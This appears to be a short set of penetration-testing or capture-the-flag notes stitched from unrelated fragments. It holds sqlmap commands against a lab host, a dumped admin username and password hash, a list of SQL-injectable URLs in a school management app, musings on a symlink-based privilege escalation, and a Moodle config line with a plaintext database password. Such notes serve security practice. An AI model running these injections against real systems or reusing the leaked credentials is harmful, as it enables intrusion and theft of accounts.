sqlmap --url 'http://10.10.53.68:873/rail/?page=reserve&sid=1' -p sid --dbs --batch --dbms=mysql
dumping the column username from table users(database orrs) gives username admin 
similarly column password has a hash '5765dcb76627ba4e2fd673e073def4ae'

Step 1. Log in to the application with teacher credentials.

Url addresses with sqli
- http://localhost/<folder>/class.php?id=7
- http://localhost/<folder>/admin/edit_teacher.php?id=1
- http://localhost/<folder>/admin/add_student.php?id=17
- http://localhost/<folder>/admin/add_course.php?id=5
- http://localhost/<folder>/admin/add_subject.php?id=5
- http://localhost/<folder>/admin/add_department.php?id=6

Step 2. Run sqlmap on the URL where the "id" parameter is given

sqlmap -r requestData.txt --dbs

I've copied the bash binary and user.txt(with symbolic links), but their perms stay the same, 
also, file/folder names with slashes aren't allowed anyways, 
there's also little documentation which explains this type of privesc(looked into cwe 73, external file name control), 
maybe somehow need to copy to `/dev/stdout` for file read but again slashes aren't allowed

$CFG->dbuser    = 'moodle_user';
$CFG->dbpass    = 'MoodleItIs@123';
